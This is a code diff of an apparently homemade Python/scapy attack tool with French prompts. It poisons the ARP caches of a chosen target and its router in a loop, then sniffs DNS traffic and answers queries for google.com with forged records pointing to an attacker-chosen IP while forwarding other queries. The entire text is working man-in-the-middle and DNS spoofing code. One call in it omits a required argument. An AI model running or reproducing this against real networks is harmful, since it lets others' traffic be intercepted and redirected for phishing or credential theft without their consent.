@@ -42,15 +42,20 @@ def forwardDnsSpoofing(spooferIP):
         if orgPacket[DNSQR].qname == b'google.com.':
             print('DNS Spoofing')
             spoofedPacket = IP(dst=orgPacket[IP].src, src=orgPacket[IP].dst) / UDP(dport=orgPacket[UDP].sport, sport=orgPacket[UDP].dport) / DNS(id=orgPacket[DNS].id, qr=1, qd=orgPacket[DNS].qd, an=DNSRR(rrname=orgPacket[DNSQR].qname, ttl=10, rdata=spooferIP) / DNSRR(rrname=orgPacket[DNSQR].qname, ttl=10, rdata=spooferIP))
-        packet = scapy.IP(dst='192.168.1.2') 
-        packet= packet / scapy.UDP(sport=orgPacket[UDP].sport, dport=53)
-        packet= packet / scapy.DNS(rd=1, id=orgPacket[DNS].id, qd=DNSQR(qname=orgPacket[DNSQR].qname))
-        answer = scapy.sr1(packet, verbose=1)
-        print('Repsonse received')
-        responsePacket = IP(dst=orgPacket[IP].src, src=orgPacket[IP].dst) / UDP(dport=orgPacket[UDP].sport, sport=53) / DNS()
-        responsePacket[DNS] = answer[DNS]
-        responsePacket.show()
-        scapy.send(responsePacket, verbose=0)
+            scapy.send(spoofedPacket, verbose=1)
+            print('DNS Spoofed')
+        else:
+            print('DNS Forwarding') 
+            scapy.send(orgPacket, verbose=1)
+            print('DNS Forwarded')
+            # packet= packet / scapy.UDP(sport=orgPacket[UDP].sport, dport=53)
+            # packet= packet / scapy.DNS(rd=1, id=orgPacket[DNS].id, qd=DNSQR(qname=orgPacket[DNSQR].qname))
+            # answer = scapy.sr1(packet, verbose=0)
+            # print('Repsonse received')
+            # responsePacket = IP(dst=orgPacket[IP].src, src=orgPacket[IP].dst) / UDP(dport=orgPacket[UDP].sport, sport=53) / DNS()
+            # responsePacket[DNS] = answer[DNS]
+            # responsePacket.show()
+            # scapy.send(responsePacket, verbose=0)
     print('DNS spoofing started')
     return forwardDNS
 
@@ -77,7 +82,7 @@ def main():
     routeur=input('Entrez le numéro du routeur : ')
     routeur=pcs[int(routeur)-1]
     print('Vous avez choisi : ' + routeur[0] + ' ' + routeur[1])
-    scapy.AsyncSniffer(prn=forwardDnsSpoofing(), filter='udp port 53 and not ip dst 127.0.0.1 and not ip dst 192.168.1.2', iface=interface).start()
+    scapy.AsyncSniffer(prn=forwardDnsSpoofing(), filter='udp port 53', iface=interface).start()
     while True:
         scapy.send(scapy.ARP(op=2, pdst=cible[1], hwdst=cible[0], psrc=routeur[1], hwsrc=myMac), verbose=0)
         scapy.send(scapy.ARP(op=2, pdst=routeur[1], hwdst=routeur[0], psrc=cible[1], hwsrc=myMac), verbose=0)
